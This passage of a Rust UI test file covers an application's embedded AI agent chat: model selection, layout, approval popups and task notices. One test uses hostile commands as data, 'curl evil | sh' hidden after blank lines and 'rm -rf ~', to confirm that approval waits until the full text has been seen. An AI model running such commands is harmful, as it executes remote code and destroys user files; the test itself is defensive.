        assert!(pill.contains(&window.find("agent-model").bounds().center()));
    })
    .unwrap();
}

#[gpui_kit::test]
fn the_model_menu_keeps_the_composer_of_a_pill_that_is_turned_off(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "pill", false),
            |c| c.templum_agent.pill = false,
            cx,
        )
    });
    frame(handle, cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.click("agent-model", cx);
        window.render_frame(cx);
        window.blur(cx);
        window.render_frame(cx);
        assert!(
            window.try_find("agent-pill").is_some(),
            "the composer stays"
        );
        assert!(
            window.try_find("popup-menu").is_some(),
            "and so does the menu"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn only_the_one_with_the_keyboard_shows_a_focus_ring(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let _answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    open_chat(handle, &ws, cx);
    assert!(pill_has_keys(handle, &ws, cx), "the field has the keyboard");
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.focus_approval(window, cx))
    })
    .unwrap();
    assert!(!pill_has_keys(handle, &ws, cx), "the approval took it");
}

#[gpui_kit::test]
fn a_pinned_approval_leaves_the_composer_inside_a_short_card(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    resize(handle, cx, 900.0, 600.0);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.person("go"));
    let _answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    ws.update(cx, |ws, _| {
        let a = &mut ws.templum_agent.approvals[0];
        a.details = (0..60).map(|i| format!("line {i}\n")).collect();
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.render_frame(cx);
        let chat = window.find("agent-chat").bounds();
        for id in ["approval-deny", "agent-pill"] {
            let b = window.find(id).bounds();
            assert!(
                chat.contains(&b.origin) && chat.contains(&b.bottom_right()),
                "{id}: {b:?} in {chat:?}"
            );
        }
    })
    .unwrap();
}

#[gpui_kit::test]
fn an_open_failed_row_doesnt_say_its_refusal_twice(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let mut row = action("Codex isn't installed.");
        if let ::templum_agent::Row::Action { state, .. } = &mut row {
            *state = ::templum_agent::ActionState::Failed;
        }
        ws.templum_agent.conversation.rows.push(row);
    });
    ws.update(cx, |ws, cx| ws.toggle_row(0, cx));
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.render_frame(cx);
        let said = window.find("agent-row-0-said");
        let call = window.find("agent-row-0-call").bounds();
        assert!(
            !call.contains(&said.bounds().center()),
            "once, under the line, not in the box"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn full_screen_fills_the_canvas_and_stays_when_the_chat_closes(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    open_chat(handle, &ws, cx);
    let card = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            let vp = ws.read(cx).viewport(window);
            let card = window.find("agent-chat").bounds();
            let below = window.viewport_size().height - (card.origin.y + card.size.height);
            (
                f32::from(card.size.width),
                f32::from(card.size.height),
                vp,
                (f32::from(card.origin.y), f32::from(below)),
            )
        })
        .unwrap()
    };
    let toggle = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            window.click("agent-full", cx);
            window.render_frame(cx);
        })
        .unwrap()
    };
    let (normal_w, normal_h, vp, _) = card(cx);
    toggle(cx);
    let (w, h, _, (top, below)) = card(cx);
    assert_eq!((w, h), (vp.w - 32.0, vp.h - 32.0));
    // 16 px in from the canvas's top (under the title bar) and bottom.
    assert_eq!(top, f32::from(gpui_kit::component::TITLE_BAR_HEIGHT) + 16.0);
    assert_eq!(below, 16.0);
    assert!(w > normal_w && h > normal_h);
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-close", cx);
        window.render_frame(cx);
    })
    .unwrap();
    open_chat(handle, &ws, cx);
    assert_eq!(card(cx).0, w, "still full once reopened");
    toggle(cx);
    assert_eq!(card(cx).0, normal_w);
}

#[gpui_kit::test]
fn the_engine_chip_picks_the_model(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    // The composer grows in real time, the chip and its menu with it: a click lands once at rest.
    no_motion(cx);
    // The floating composer (the chat is closed, its conversation empty): the chip's menu has the
    // keyboard, and the composer stays for it while the field has none and holds no text.
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.toggle_agent(window, cx))
    })
    .unwrap();
    assert!(!ws.read_with(cx, |ws, _| ws.templum_agent.open));
    let model =
        |cx: &mut TestAppContext| ws.read_with(cx, |ws, _| ws.config.templum_agent.model.clone());
    let pick = |n: usize, cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| {
            window.click("agent-model", cx);
            window.render_frame(cx);
            // The button takes the keyboard from the field, as a mouse down on it does.
            window.blur(cx);
            window.within("popup-menu").click(n, cx);
            window.render_frame(cx);
        })
        .unwrap()
    };
    // Default, haiku, sonnet, opus, Another model….
    pick(2, cx);
    assert!(
        pill_has_keys(handle, &ws, cx),
        "the field keeps the keyboard"
    );
    assert_eq!(model(cx), "sonnet");
    ws.read_with(cx, |ws, _| {
        assert_eq!(crate::chat::pill::engine(ws), "Claude Code · sonnet")
    });
    pick(0, cx);
    assert_eq!(model(cx), "", "Default clears it");
    pick(4, cx);
    ws.read_with(cx, |ws, _| {
        let panel = ws.settings.as_ref().expect("Settings opened");
        assert_eq!(panel.section, crate::settings::Section::TemplumAgent);
    });
}

#[gpui_kit::test]
fn the_chip_shows_the_model_the_engine_reports_and_the_chosen_one_until_then(
    cx: &mut TestAppContext,
) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN, TEXT_TURN]);
    let chip = |cx: &mut TestAppContext| ws.read_with(cx, |ws, _| crate::chat::pill::engine(ws));
    assert_eq!(chip(cx), "Claude Code");
    send(handle, &ws, cx, "hi");
    rows_until(&ws, cx, ended);
    assert_eq!(chip(cx), "Claude Code · claude-opus-5-5");
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "model", "sonnet"),
            |c| c.templum_agent.model = "sonnet".into(),
            cx,
        )
    });
    frame(handle, cx);
    assert_eq!(
        chip(cx),
        "Claude Code · sonnet",
        "until the new engine reports"
    );
    send(handle, &ws, cx, "again");
    rows_until(&ws, cx, |rows| {
        let ends = rows
            .iter()
            .filter(|r| matches!(r, ::templum_agent::Row::End { .. }));
        ends.count() == 2
    });
    assert_eq!(chip(cx), "Claude Code · claude-opus-5-5");
}

#[gpui_kit::test]
fn a_pick_mid_turn_is_not_undone_by_the_old_process_reporting_again(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    // The first turn is still going when the person picks and sends a follow-up, which the same
    // process takes in a turn of its own, with its own init on the old model.
    let end = TEXT_TURN
        .lines()
        .find(|l| l.contains(r#""type":"result""#))
        .unwrap();
    let (handle, ws) = with_fake_engine(
        cx,
        dir.path(),
        &[&endless_turn(), &format!("{end}\n{TEXT_TURN}")],
    );
    send(handle, &ws, cx, "hi");
    rows_until(&ws, cx, |rows| {
        rows.iter()
            .any(|r| matches!(r, ::templum_agent::Row::Text { .. }))
    });
    ws.update(cx, |ws, cx| {
        ws.edit(
            Edit::set("templum_agent", "model", "sonnet"),
            |c| c.templum_agent.model = "sonnet".into(),
            cx,
        )
    });
    frame(handle, cx);
    send(handle, &ws, cx, "and this");
    rows_until(&ws, cx, ended);
    ws.read_with(cx, |ws, _| {
        assert!(
            ws.templum_agent.engine.is_none(),
            "it ended at the turn's end"
        );
        assert_eq!(crate::chat::pill::engine(ws), "Claude Code · sonnet");
    });
}

#[gpui_kit::test]
fn an_approval_in_the_open_card_takes_the_column(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let _answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    open_chat(handle, &ws, cx);
    for full in [false, true] {
        ws.update(cx, |ws, _| ws.templum_agent.full = full);
        cx.update_window(handle, |_, window, cx| {
            window.render_frame(cx);
            let card = window.find("agent-chat").bounds();
            let approval = window.find("approval").bounds();
            assert_eq!(
                f32::from(approval.size.width),
                crate::chat::look::column(f32::from(card.size.width)),
                "full: {full}"
            );
            let (left, right) = (
                approval.left() - card.left(),
                card.right() - approval.right(),
            );
            assert!(
                (f32::from(left) - f32::from(right)).abs() <= 0.5,
                "centered: {left:?} {right:?}"
            );
            if !full {
                // 1 px of border and 16 of gutter.
                assert_eq!(left, gpui_kit::px(17.0));
            }
        })
        .unwrap();
    }
}

#[gpui_kit::test]
fn full_screen_keeps_the_column_readable(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("hi");
        c.apply(::templum_agent::ChatEvent::Text("an answer".into()));
        ws.templum_agent.full = true;
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let card = window.find("agent-chat").bounds();
        let row = window.find("agent-row-1").bounds();
        let want = crate::chat::look::column(f32::from(card.size.width));
        assert_eq!(f32::from(row.size.width), want);
        assert!(want <= 720.0);
        let (left, right) = (row.left() - card.left(), card.right() - row.right());
        assert!(
            (f32::from(left) - f32::from(right)).abs() <= 0.5,
            "centered: {left:?} {right:?}"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn an_approval_of_the_closed_chat_keeps_its_width_in_full_screen(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| ws.templum_agent.full = true);
    let _answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let vp = ws.read(cx).viewport(window);
        assert!(!ws.read(cx).templum_agent.open);
        let width = f32::from(window.find("approval").bounds().size.width);
        assert_eq!(width, 640.0_f32.min(vp.w - 32.0));
    })
    .unwrap();
}

#[gpui_kit::test]
fn suggestions_fill_the_field(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    // Full screen: the normal card's body is too short for all four.
    ws.update(cx, |ws, _| ws.templum_agent.full = true);
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        for n in 0..4 {
            assert!(window.try_find(format!("agent-suggestion-{n}")).is_some());
        }
        window.click("agent-suggestion-0", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert_eq!(
        pill_text(&ws, cx),
        "Set up a workspace for a project, with a kanban and an agent per card"
    );
    cx.update_window(handle, |_, window, cx| {
        window.click("agent-suggestion-3", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert_eq!(
        pill_text(&ws, cx),
        "Open an agent for each card on my board"
    );
}

#[gpui_kit::test]
fn the_greeting_comes_back_after_new_chat(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent.full = true;
        ws.templum_agent.conversation.person("go")
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("agent-greeting").is_none());
        window.click("agent-new", cx);
        window.render_frame(cx);
        assert!(window.try_find("agent-greeting").is_some());
        assert!(window.try_find("agent-suggestion-3").is_some());
    })
    .unwrap();
}

#[gpui_kit::test]
fn scrolling_up_shows_the_way_back_to_the_end(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.person("go");
        for i in 0..400 {
            c.note(&format!("note {i}"));
        }
    });
    open_chat(handle, &ws, cx);
    let shown = |cx: &mut TestAppContext, id: &'static str| {
        cx.update_window(handle, |_, window, cx| {
            window.render_frame(cx);
            window.render_frame(cx);
            window.try_find(id).is_some()
        })
        .unwrap()
    };
    assert!(!shown(cx, "agent-to-end"), "at its end");
    ws.read_with(cx, |ws, _| {
        ws.templum_agent.list.scroll_by(gpui_kit::px(-2000.0))
    });
    assert!(shown(cx, "agent-to-end"), "scrolled up");
    assert!(!shown(cx, "agent-to-end-new"));
    ws.update(cx, |ws, _| ws.templum_agent.conversation.note("new"));
    assert!(shown(cx, "agent-to-end-new"), "a row came below");
    cx.update_window(handle, |_, window, cx| window.click("agent-to-end", cx))
        .unwrap();
    assert!(!shown(cx, "agent-to-end"), "back at its end");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.list.is_following_tail()));
}

#[gpui_kit::test]
fn rows_fade_in_only_when_they_arrive_while_the_chat_is_open(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.note("one"));
    open_chat(handle, &ws, cx);
    let render = |cx: &mut TestAppContext| {
        cx.update_window(handle, |_, window, cx| window.render_frame(cx))
            .unwrap()
    };
    let arrival = |cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| {
            ws.templum_agent.arrival.get().map(|(from, _)| from)
        })
    };
    render(cx);
    assert_eq!(arrival(cx), None, "rows there when it opens show at once");
    let n = ws.update(cx, |ws, _| {
        let c = &mut ws.templum_agent.conversation;
        c.note("two");
        c.rows.len() - 1
    });
    render(cx);
    assert_eq!(arrival(cx), Some(n));
    ws.update(cx, |ws, _| ws.templum_agent.open = false);
    render(cx);
    ws.update(cx, |ws, _| ws.templum_agent.conversation.note("three"));
    open_chat(handle, &ws, cx);
    render(cx);
    assert_eq!(
        arrival(cx),
        Some(n),
        "rows that came while it was closed don't fade"
    );
}

#[gpui_kit::test]
fn a_short_card_keeps_its_composer_under_the_greeting(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    resize(handle, cx, 900.0, 420.0);
    ws.update(cx, |ws, _| {
        ws.templum_agent.conversation.note("New conversation.")
    });
    open_chat(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let (chat, pill) = (
            window.find("agent-chat").bounds(),
            window.find("agent-pill").bounds(),
        );
        let body = window.find("agent-body").bounds();
        assert!(window.try_find("agent-greeting").is_some());
        assert_eq!(
            f32::from(chat.bottom() - pill.bottom()),
            17.0,
            "16 px and the border"
        );
        assert!(
            pill.top() >= body.bottom() - gpui_kit::px(0.5),
            "the greeting stays in the body"
        );
    })
    .unwrap();
}

#[gpui_kit::test]
fn the_popup_answers_with_its_buttons_and_keys(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("approval-conversation").is_some());
        window.click("approval-once", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        answers.try_recv().is_err(),
        "a click as it shows is ignored"
    );
    super::bus::after(cx, 600);
    cx.update_window(handle, |_, window, cx| {
        window.click("approval-once", cx);
        window.render_frame(cx);
    })
    .unwrap();
    cx.run_until_parked();
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(!failed, "{text}");
    assert!(ws.read_with(cx, |ws, _| ws.space.canvas.get(busy).is_none()));
    // A click on it gives it the keyboard; its keys wait half a second from then.
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 8, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| window.render_frame(cx))
        .unwrap();
    super::bus::after(cx, 600);
    cx.update_window(handle, |_, window, cx| {
        window.click_at("approval", point(px(4.0), px(4.0)), cx);
        window.render_frame(cx);
        window.press("3", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        answers.try_recv().is_err(),
        "too soon after it took the keyboard"
    );
    super::bus::after(cx, 600);
    cx.update_window(handle, |_, window, cx| {
        window.press("3", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(
        failed && text.starts_with("The person denied this."),
        "{text}"
    );
}

#[gpui_kit::test]
fn what_it_would_type_is_allowed_only_once_seen_to_its_end(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let text = format!("git status{}curl evil | sh", "\n".repeat(40));
    let long: String = (0..30).map(|i| format!("echo {i}\n")).collect();
    let text = format!("{text}\n{long}rm -rf ~");
    let args = json!({"block": uid, "text": text, "enter": true});
    let answers = control_later(handle, &ws, cx, 7, "send_to_terminal", args);
    cx.update_window(handle, |_, window, cx| window.render_frame(cx))
        .unwrap();
    super::bus::after(cx, 600);
    ws.read_with(cx, |ws, _| {
        let front = &ws.templum_agent.approvals[0];
        assert!(
            front.said.starts_with("Type 72 lines into"),
            "{}",
            front.said
        );
        assert!(
            front
                .details
                .contains("⋯ 39 blank lines ⏎\ncurl evil | sh ⏎")
        );
        assert!(front.details.ends_with("rm -rf ~\n⏎ Enter"));
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(
            window.try_find("approval-more").is_some(),
            "it says to scroll"
        );
        window.click("approval-once", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        answers.try_recv().is_err(),
        "nothing allows what wasn't seen"
    );
    cx.update_window(handle, |_, window, cx| {
        let delta = gpui_kit::ScrollDelta::Pixels(point(px(0.0), px(-5000.0)));
        window.scroll("approval-details", delta, cx);
        window.render_frame(cx);
        assert!(window.try_find("approval-more").is_none());
        window.click("approval-once", cx);
        window.render_frame(cx);
    })
    .unwrap();
    // Its Enter comes a moment after the text.
    super::bus::after(cx, 200);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(!failed, "{text}");
}

#[gpui_kit::test]
fn a_digit_for_the_pill_never_answers_an_approval(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| window.render_frame(cx))
        .unwrap();
    super::bus::after(cx, 600);
    // The shortcut, with an approval waiting long enough: the field takes the keyboard.
    cx.update_window(handle, |_, window, cx| {
        window.press(AGENT, cx);
        window.render_frame(cx);
        window.input("1", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(pill_has_keys(handle, &ws, cx));
    assert_eq!(pill_text(&ws, cx), "1");
    assert!(answers.try_recv().is_err(), "the 1 is the pill's");
    // A click on the pill that asks: its field too.
    cx.update_window(handle, |_, window, cx| {
        window.press("escape", cx);
        window.render_frame(cx);
        ws.update(cx, |ws, cx| {
            let input = ws.templum_agent.input.clone().unwrap();
            input.update(cx, |input, cx| input.set_value("", window, cx));
        });
        window.render_frame(cx);
        assert!(window.try_find("agent-asks").is_some());
        window.click("agent-asks", cx);
        window.render_frame(cx);
        window.input("2", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(pill_has_keys(handle, &ws, cx));
    assert!(answers.try_recv().is_err(), "the 2 is the pill's");
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.templum_agent.approvals.len()),
        1
    );
}

#[gpui_kit::test]
fn it_never_takes_a_terminals_keyboard(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let first = first_id(&ws, cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.focus_block(first, window, cx));
        window.render_frame(cx);
    })
    .unwrap();
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    super::bus::after(cx, 600);
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(
            ws.read(cx).focus_handle.is_focused(window),
            "the terminal keeps the keyboard"
        );
        window.press("1", cx);
        window.render_frame(cx);
    })
    .unwrap();
    assert!(
        answers.try_recv().is_err(),
        "a 1 for the shell answers nothing"
    );
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.templum_agent.approvals.len()),
        1
    );
}

#[gpui_kit::test]
fn the_words_field_denies_with_them(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        window.click("approval-words", cx);
        window.render_frame(cx);
        window.input("not now", cx);
        window.press("enter", cx);
        window.render_frame(cx);
    })
    .unwrap();
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(failed && text.ends_with("They said: not now"), "{text}");
}

#[gpui_kit::test]
fn a_background_window_gets_a_notification(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    super::terminals::set_active(handle, true, cx);
    frame(handle, cx);
    let before = notification_count(handle, cx);
    let _seen = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    assert_eq!(notification_count(handle, cx), before, "the pill shows it");
    super::terminals::set_active(handle, false, cx);
    let _away = control_later(handle, &ws, cx, 8, "close_block", json!({"block": uid}));
    assert_eq!(notification_count(handle, cx), before + 1);
    assert!(
        ws.read_with(cx, |ws, _| ws.last_chime.is_some()),
        "and its sound"
    );
}

#[gpui_kit::test]
fn its_blocks_wear_its_mark(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = open_in(cx, None, Some(dir.path().to_path_buf()));
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": shown, "kind": "terminal"}),
    );
    let uid = id_in(&text);
    let mark = format!("agent-mark-{uid}");
    ws.update(cx, |ws, _| {
        ws.space.canvas.camera = Camera::at(Point::new(0.0, 0.0), 1.0)
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find(mark.clone()).is_some(), "at the Full level");
    })
    .unwrap();
    ws.update(cx, |ws, _| {
        ws.space.canvas.camera = Camera::at(Point::new(0.0, 0.0), 0.2);
        ws.space.rest = 0.2;
        ws.space.focused = None;
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find(mark.clone()).is_none(), "not at Card");
    })
    .unwrap();
    ws.update(cx, |ws, cx| ws.save_canvas_now(cx));
    let (handle, again) = open_in(cx, None, Some(dir.path().to_path_buf()));
    again.update(cx, |ws, _| {
        ws.space.canvas.camera = Camera::at(Point::new(0.0, 0.0), 1.0);
        ws.space.rest = 1.0;
    });
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find(mark.clone()).is_some(), "after a restart");
    })
    .unwrap();
}

#[gpui_kit::test]
fn a_touch_glows_for_a_moment(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let shown = ws.read_with(cx, |ws, _| ws.space.id.clone());
    let (_, text) = control(
        handle,
        &ws,
        cx,
        "add_block",
        json!({"workspace": shown, "kind": "note"}),
    );
    let uid = id_in(&text);
    let now = cx.executor().now();
    ws.read_with(cx, |ws, _| {
        let at = ws.templum_agent.glow.get(&uid).copied().expect("it glows");
        assert!(crate::chat::glow(at, now).is_some());
        assert!(
            crate::chat::glow(at, at + std::time::Duration::from_millis(1300)).is_none(),
            "and stops"
        );
        // Twice over 1.2 s: lit, dark between, lit again.
        let at_ms = |ms| crate::chat::glow(at, at + std::time::Duration::from_millis(ms)).unwrap();
        assert!(
            at_ms(300) > 0.9 && at_ms(600) < 0.1 && at_ms(900) > 0.9,
            "{} {} {}",
            at_ms(300),
            at_ms(600),
            at_ms(900)
        );
    });
}

/// A terminal whose agent the Templum Agent handed task 1: its block, its uid, its terminal.
fn handed_by_the_templum_agent(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
) -> (BlockId, String, String) {
    let (block, uid) = busy_terminal(handle, ws, cx);
    let terminal = ws.update(cx, |ws, _| {
        ws.next_task += 1;
        let pane = ws.space.terminal_mut(block).unwrap();
        pane.handed = Some(crate::workspace::Handed {
            id: ws.next_task,
            ..crate::workspace::Handed::new(
                ::templum_agent::ASKER,
                std::time::Duration::from_secs(600),
            )
        });
        pane.term.id().to_string()
    });
    (block, uid, terminal)
}

fn notices(
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
) -> Vec<(::templum_agent::NoticeLevel, Option<String>)> {
    ws.read_with(cx, |ws, _| {
        ws.templum_agent
            .conversation
            .rows
            .iter()
            .filter_map(|r| match r {
                ::templum_agent::Row::Notice { level, target, .. } => {
                    Some((*level, target.as_ref().and_then(|t| t.block.clone())))
                }
                _ => None,
            })
            .collect()
    })
}

#[gpui_kit::test]
fn a_tasks_end_wakes_the_templum_agent(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (_, uid, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    ws.update(cx, |ws, cx| {
        ws.end_turn(&terminal, templum_mcp::Reply::ok("Card 4 is done."), cx)
    });
    super::bus::after(
        cx,
        crate::workspace::delegate::SPENT_AFTER.as_millis() as u64,
    );
    assert_eq!(
        notices(&ws, cx),
        [(::templum_agent::NoticeLevel::Done, Some(uid))]
    );
    let sent = ws.read_with(cx, |ws, _| ws.templum_agent.sent.clone());
    assert!(
        sent.iter().any(|m| m.starts_with("[task t1 from ")),
        "{sent:?}"
    );
    assert!(
        sent.iter().any(|m| m.contains("Card 4 is done.")),
        "{sent:?}"
    );
    rows_until(&ws, cx, ended);
}

/// The Templum Agent, which no block names, is answered by `reply` without a block as by a turn's
/// end (docs/specs/agent-protocol.md, 2).
#[gpui_kit::test]
fn a_reply_ends_the_templum_agents_task(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (_, uid, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    let reply = json!({ "text": "Card 4 is done." });
    let (failed, text) = super::bus::call(handle, &ws, cx, &terminal, "reply", reply);
    assert_eq!((failed, text.as_str()), (false, "Answered task t1."));
    super::bus::after(
        cx,
        crate::workspace::delegate::SPENT_AFTER.as_millis() as u64,
    );
    assert_eq!(
        notices(&ws, cx),
        [(::templum_agent::NoticeLevel::Done, Some(uid))]
    );
    let sent = ws.read_with(cx, |ws, _| ws.templum_agent.sent.clone());
    assert!(
        sent.iter().any(|m| m.starts_with("[task t1 from ")),
        "{sent:?}"
    );
    assert!(
        sent.iter().any(|m| m.contains("Card 4 is done.")),
        "{sent:?}"
    );
    rows_until(&ws, cx, ended);
}

/// Its chat shows each notice when it comes; only what its engine is told waits for the others
/// (docs/specs/notice-batching.md): the last task running ends, and it hears them as one message.
#[gpui_kit::test]
fn the_chat_shows_each_notice_at_once_and_the_engine_hears_a_batch(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let tasks: Vec<_> = (0..3)
        .map(|_| handed_by_the_templum_agent(handle, &ws, cx))
        .collect();
    let spent = crate::workspace::delegate::SPENT_AFTER.as_millis() as u64;
    for (i, (_, _, terminal)) in tasks[..2].iter().enumerate() {
        ws.update(cx, |ws, cx| {
            ws.end_turn(terminal, templum_mcp::Reply::ok(format!("Answer {i}.")), cx)
        });
    }
    super::bus::after(cx, spent);
    assert_eq!(notices(&ws, cx).len(), 2, "its chat shows both");
    assert!(
        ws.read_with(cx, |ws, _| ws.templum_agent.sent.is_empty()),
        "its engine waits for the third"
    );
    let (_, _, terminal) = &tasks[2];
    ws.update(cx, |ws, cx| {
        ws.end_turn(terminal, templum_mcp::Reply::ok("Answer 2."), cx)
    });
    super::bus::after(cx, spent);
    assert_eq!(notices(&ws, cx).len(), 3);
    let sent = ws.read_with(cx, |ws, _| ws.templum_agent.sent.clone());
    assert_eq!(sent.len(), 1, "{sent:?}");
    assert!(sent[0].starts_with("[3 tasks ended] "), "{sent:?}");
    for i in 0..3 {
        assert!(sent[0].contains(&format!("Answer {i}.")), "{sent:?}");
    }
}

#[gpui_kit::test]
fn a_lone_notice_reaches_the_engine_at_once(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (_, _, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    ws.update(cx, |ws, cx| {
        ws.end_turn(&terminal, templum_mcp::Reply::ok("Only."), cx)
    });
    super::bus::after(
        cx,
        crate::workspace::delegate::SPENT_AFTER.as_millis() as u64,
    );
    let sent = ws.read_with(cx, |ws, _| ws.templum_agent.sent.clone());
    assert_eq!(sent.len(), 1, "{sent:?}");
    assert!(sent[0].starts_with("[task t1 from "), "{sent:?}");
}

#[gpui_kit::test]
fn a_failed_task_is_red(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    let (_, uid, terminal) = handed_by_the_templum_agent(handle, &ws, cx);
    ws.update(cx, |ws, cx| {
        ws.end_turn(&terminal, templum_mcp::Reply::err("It broke."), cx)
    });
    super::bus::after(
        cx,
